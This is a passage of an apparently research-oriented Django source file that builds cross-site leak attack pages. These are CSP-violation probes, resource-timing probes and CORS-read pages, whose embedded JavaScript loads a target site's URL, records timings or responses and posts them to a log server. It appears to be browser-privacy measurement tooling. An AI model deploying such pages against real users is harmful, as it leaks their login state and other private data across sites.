	timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
	filename = "html-page-%s.html"%(timestamp)
	filepath = os.path.join(base_dir,filename)
	with open(filepath, "wb") as htmlFile:
		htmlFile.write(html)


def get_base_url(address):
	
	split_url = urlparse(address)
	return split_url.scheme+ "://" + split_url.netloc

def getCSPAttackPage(request, site_id, state_status):

	site_url = site_dict[site_id][0] 
	targetQQQQ = request.GET.get("fr", site_url)
	target_url = decodeURL_Plus(targetQQQQ)
	print target_url

	tag_name = request.GET.get("tag", "iframe")
	runHashId = request.GET.get("hash", "")
	truncated_url = get_base_url(target_url)


	# set e.g Content-Security-Policy: script-src 'self' https://apis.google.com report-uri log-controller
	# log controller: record-csp-violation/site-id/state-status/tag-name/run-hash-id/target-url/
	log_target_url = encodeURL_Plus(target_url)
	report_uri = LOG_SERVER_BASE_DEFAULT + "record-csp-violation/%s/%s/%s/%s/?target=%s"%(site_id, state_status, tag_name, runHashId, log_target_url)
	csp_header = get_csp_header(tag_name , truncated_url, report_uri)

	document_title = "csp-attack"
	if tag_name == "frame":
		html = get_base_dom_document_with_frameset(document_title)
		html = attach_csp_html_tag_frameset(html, target_url, tag_name)
		html = attach_csp_log_sender_frameset(html, report_uri)
	else:
		html = get_base_dom_document(document_title)
		html = attach_csp_html_tag(html, target_url, tag_name)
		html = attach_csp_log_sender(html, report_uri)

	html_save_test_page_dir = get_or_create_csp_test_pages_directory(site_id)
	save_html_response(html_save_test_page_dir, html)
	
	response = HttpResponse(html)
	response["Content-Security-Policy"] = csp_header

	return response


# --------------------------------------------------------------------------- #
#						Resource Timing Analysis (TA)
# --------------------------------------------------------------------------- #

def get_or_create_ta_test_pages_directory(siteId, tag_name):
	global BROWSER_REPORT_FOLDER
	relative_dir = "automator/%s/TestPages/TA/%s/%s"%(siteId, BROWSER_REPORT_FOLDER, tag_name)
	abs_dir = os.path.join(ROOT_DIR, relative_dir)
	if not os.path.exists(abs_dir):
		os.makedirs(abs_dir)
	return abs_dir

# def get_corresponding_ta_js(target_url, tag_name):
# 	if tag_name == "img":
# 		js = '''
# 		<script type="text/javascript">
# 		window.recordMe = 0;
# 		var tag1 = document.createElement('img');
# 		var startTime = window.performance.now();
# 		tag1.setAttribute('data-start', startTime);
# 		tag1.onerror = function(){
# 			var endTime = window.performance.now();
# 			var s = tag1.getAttribute('data-start');
# 			window.recordMe = endTime - s;
# 		}
# 		document.body.appendChild(tag1);
# 		// Start the tag request
# 		tag1.setAttribute("src", "%s");
# 		</script>
# 		'''%target_url
# 		return js
# 	elif tag_name == "video" or tag_name == "audio":
# 		js = '''
# 		<script type="text/javascript">
# 		window.recordMe = 0;
# 		var tag2 = document.createElement('%s');
# 		tag2.onerror = function(){
# 			var endTime = window.performance.now();
# 			var s = tag2.getAttribute('data-start');
# 			if(typeof s !== 'undefined'){
# 				window.recordMe= endTime - s;
# 			}else{
# 				// if onloadstart is not triggered, start is not recorded
# 				window.recordMe = 0;
# 			}
# 		}
# 		tag2.onloadstart = function(){
# 			var startTime = window.performance.now();
# 			tag2.setAttribute('data-start', startTime);
# 		}
# 		document.body.appendChild(tag2);
# 		// Start the tag request
# 		tag2.setAttribute('src', '%s');
# 		</script>
# 		'''%(tag_name, target_url)
# 		return js	
# 	elif tag_name == "script":
# 		js = '''
# 		<script type="text/javascript">
# 		window.recordMe = 0;
# 		var tag3 = document.createElement('script');
# 		tag3.onerror = function(){ // is not fired in chrome
# 			var endTime = window.performance.now();
# 			var s = tag3.getAttribute('data-start');
# 			if(typeof s !== 'undefined'){
# 				window.recordMe= endTime - s;
# 			}else{
# 				// if onload is not triggered, start is not recorded
# 				window.recordMe = 0;
# 			}
# 		}
# 		tag3.onload= function(){
# 			// script downloaded
# 			var startTime = window.performance.now();
# 			tag3.setAttribute('data-start', startTime);
# 		}
# 		document.body.appendChild(tag3);
# 		// Start the tag request
# 		tag3.setAttribute('src', '%s');
# 		</script>
# 		'''%(target_url)
# 		return js	
# 	elif tag_name == "link":
# 		js = '''
# 		<script type="text/javascript">
# 		window.recordMe = 0;
# 		var tag4 = document.createElement('link');
# 		tag4.setAttribute('rel', 'stylesheet')
# 		tag4.onerror = function(){ // is not fired in chrome and edge
# 			var endTime = window.performance.now();
# 			var s = tag4.getAttribute('data-start');
# 			if(typeof s !== 'undefined'){
# 				window.recordMe= endTime - s;
# 			}else{
# 				// if onload is not triggered, start is not recorded
# 				window.recordMe = 0;
# 			}
# 		}
# 		tag4.onload= function(){
# 			// script downloaded
# 			var startTime = window.performance.now()
# 			tag4.setAttribute('data-start', startTime)
# 		}
# 		document.body.appendChild(tag4);
# 		// Start the tag request
# 		tag4.setAttribute('href', '%s');
# 		</script>
# 		'''%(target_url)
# 		return js
# 	else:
# 		return ""		

def get_ta_log_variable_name_as_string():
	return "window.eventTAs"

def attach_ta_log_sender(html, runHashId, target_url, siteId, state_status, tag_name, js_time_var_as_string, log_endpoint):
	js = '''
		<script type="text/javascript">
		var postTA = function(){
			var logMessage = {
				"runHashId": "%s",
				"target_url": "%s", 
				"siteId": "%s",
				"state_status": "%s",
				"tag": "%s",
				"time": JSON.stringify(%s),
			}

		    request = $.ajax({
		        url: "%s",
		        contentType: "application/json; charset=utf-8",
		        type: "post",
		        data: JSON.stringify(logMessage),
		        dataType: 'text',
		        crossDomain: true,
		    });

		    // Callback handler that will be called on success
		    request.done(function (response, textStatus, jqXHR){
		        console.log("message sent to log server");
		        console.log(response)
		    });

		    // Callback handler that will be called on failure
		    request.fail(function (jqXHR, textStatus, errorThrown){
		        console.error("The following error occurred: "+ textStatus, errorThrown);
		    });
	    }
		setTimeout(function() {
				postTA();
	    	}, 4000); // wait for 4s for the window.recordMe to be filled by the browser
		</script>
	'''%(runHashId, target_url, siteId, state_status, tag_name, js_time_var_as_string, log_endpoint)

	returnHTML = include_tag_in_body(html, js)
	return returnHTML


def attach_ta_tag_to_html(html, target_url, tag_name):
	event_list = ['onload', 'onerror', 'onprogress', 'onabort', 'onchange', 'onscroll', 'onunload', 'hashchange' ,'onwaiting', 'onloadstart','onafterprint', 'onbeforeunload', 'oncanplay', 'oncanplaythrough', 'ondurationchange' , 'oncontextmenu', 'onended', 'onloadeddata', 'onloadedmetadata', 'oninvalid', 'onsuspend']
	attribute = get_corresponding_attribute(tag_name)
	if tag_name == "input":
		js = '''
		<script type="text/javascript">
			window.eventTAs = { };
			window.startTime = window.performance.now();
			var tag = document.createElement("%s");
			tag.setAttribute("type", "image");
			tag.setAttribute("%s", "%s");
		'''%(tag_name, attribute, target_url)
		for event_name in event_list:
			appendJs= '''

				tag.%s = function(){
					window.eventTAs["%s"] = window.performance.now() - window.startTime;
				}
			'''%(event_name, event_name)
			js = js + appendJs

		endJs = ''' 
				
				document.body.appendChild(tag);
				</script>
				'''
		js = js + endJs
	elif tag_name == "videoPoster":
		js = '''
		<script type="text/javascript">
			window.eventTAs = { };
			window.startTime = window.performance.now();
			var tag = document.createElement("video");
			tag.setAttribute("poster", "%s");
		'''%(target_url)
		for event_name in event_list:
			appendJs= '''

				tag.%s = function(){
					window.eventTAs["%s"] = window.performance.now() - window.startTime;
				}
			'''%(event_name, event_name)
			js = js + appendJs

		endJs = ''' 
				
				document.body.appendChild(tag);
				</script>
				'''
		js = js + endJs
	else:
		js = '''
		<script type="text/javascript">
			window.eventTAs = { };
			window.startTime = window.performance.now();
			var tag = document.createElement("%s");
			tag.setAttribute("%s", "%s");
		'''%(tag_name, attribute, target_url)
		for event_name in event_list:
			appendJs= '''

				tag.%s = function(){
					window.eventTAs["%s"] = window.performance.now() - window.startTime;
				}
			'''%(event_name, event_name)
			js = js + appendJs

		endJs = ''' 
				
				document.body.appendChild(tag);
				</script>
				'''
		js = js + endJs
	returnHTML = include_tag_in_body(html, js)
	return returnHTML
	


def get_timing_analsis_attack_page(request, site_id, state_status):

	site_url = site_dict[site_id][0] 
	target_url = request.GET.get("fr", site_url)
	target_url = decodeURL_Plus(target_url)
	tag_name = request.GET.get("tag", "img")
	run_hash_id = request.GET.get("hash", "")

	document_title = "timing-analysis-attack"
	html = get_base_dom_document(document_title)
	html = attach_ta_tag_to_html(html, target_url, tag_name);

	# build the log endpoint 
	log_endpoint = LOG_SERVER_BASE_DEFAULT + "record-ta-data/%s/"%(site_id)

	# attach the log sender to the logendpoint
	js_time_var_as_string = get_ta_log_variable_name_as_string()
	html = attach_ta_log_sender(html, run_hash_id, target_url, site_id, state_status, tag_name, js_time_var_as_string, log_endpoint)
	# save the html attack page and return it
	html_save_test_page_dir = get_or_create_ta_test_pages_directory(site_id, tag_name)
	save_html_response(html_save_test_page_dir, html)
	return HttpResponse(html)




def cssTest(request):
	html='''
	<!DOCTYPE html>
	<html>
		<head>
			<title>css-attack</title>
			<meta charset="utf-8">

			<script
			src="https://code.jquery.com/jquery-3.3.1.min.js"
			integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
			crossorigin="anonymous"></script>	
			<link id="included-styles" rel="stylesheet" href="https://cdn.sstatic.net/Shared/stacks.css?v=4661c036bf63">

			<script type="text/javascript">
			// $(document).ready(function(){
				//document.domain = 'cdn.sstatic.net';
				//[].slice.call(document.styleSheets[0].cssRules).forEach(function(rule){
				//	  console.log('rule:', rule.cssText)
				//	});
			//});
			</script>
		</head>
		<frameset> 
			<frame src='https://cdn.sstatic.net/Shared/stacks.css?v=4661c036bf63'> </frame>
		</frameset>
	</html>
	'''
	return HttpResponse(html)


# --------------------------------------------------------------------------- #
#						CORS Test
# --------------------------------------------------------------------------- #

# callback name to send the results to the logserver
def get_cors_callback_func_name():
	return "postCORS"

def get_cors_log_variable():
	return "window.CORSContent"

def attach_cors_log_sender(html, runHashId, target_url, siteId, state_status, js_log_var_as_string, log_endpoint):
	js = '''
		<script type="text/javascript">
		var postCORS = function(){
			var logMessage = {
				"runHashId": "%s",
				"target_url": "%s", 
				"siteId": "%s",
				"state_status": "%s",
				"response": JSON.stringify(%s)
			}

		    request = $.ajax({
		        url: "%s",
		        contentType: "application/json; charset=utf-8",
		        type: "post",
		        data: JSON.stringify(logMessage),
		        dataType: 'text',
		        crossDomain: true,
		    });

		    // Callback handler that will be called on success
		    request.done(function (response, textStatus, jqXHR){
		        console.log("message sent to log server");
		        console.log(response)
		    });

		    // Callback handler that will be called on failure
		    request.fail(function (jqXHR, textStatus, errorThrown){
		        console.error("The following error occurred: "+ textStatus, errorThrown);
		    });
	    }
		</script>
	'''%(runHashId, target_url, siteId, state_status, js_log_var_as_string, log_endpoint)

	returnHTML = include_tag_in_body(html, js)
	return returnHTML


def attach_cors_collector_html(html,target_url, callback_func_name):
	js = '''
	<script type="text/javascript">
		window.CORSContent = { };
	    request = $.ajax({
	        url: "%s",
	        contentType: "application/json; charset=utf-8",
	        type: "GET",
	        dataType: 'text',
	        crossDomain: true,
	    });

	    // Callback handler that will be called on success
	    request.done(function (response, textStatus, jqXHR){
	    	window.CORSContent = {"response": response, "textStatus": textStatus, "jqXHR": jqXHR};
	        %s(window.CORSContent);
	        console.log(response);
	    });

	    // Callback handler that will be called on failure
	    request.fail(function (jqXHR, textStatus, errorThrown){
	    	window.CORSContent = {"response": errorThrown, "textStatus": textStatus, "jqXHR": jqXHR};
	        %s(window.CORSContent);
	        console.log(errorThrown);
	    });
	    
	</script>
	'''%(target_url, callback_func_name, callback_func_name)

	returnHTML = include_tag_in_body(html, js)
	return returnHTML

def get_cors_attack_page(request, site_id, state_status):

	site_url = site_dict[site_id][0] 
	target_url = request.GET.get("fr", site_url)
	target_url = decodeURL_Plus(target_url)
	run_hash_id = request.GET.get("hash", "")

	document_title = "timing-analysis-attack"
	html = get_base_dom_document(document_title)


	# build the log endpoint 
	log_endpoint = LOG_SERVER_BASE_DEFAULT + "record-cors-data/%s/"%(site_id)

	# attach the log sender to the logendpoint
	js_log_var_as_string = get_cors_log_variable()
	html = attach_cors_log_sender(html, run_hash_id, target_url, site_id, state_status, js_log_var_as_string, log_endpoint)

	log_callback_reference = get_cors_callback_func_name()
	html = attach_cors_collector_html(html, target_url, log_callback_reference);

	return HttpResponse(html)



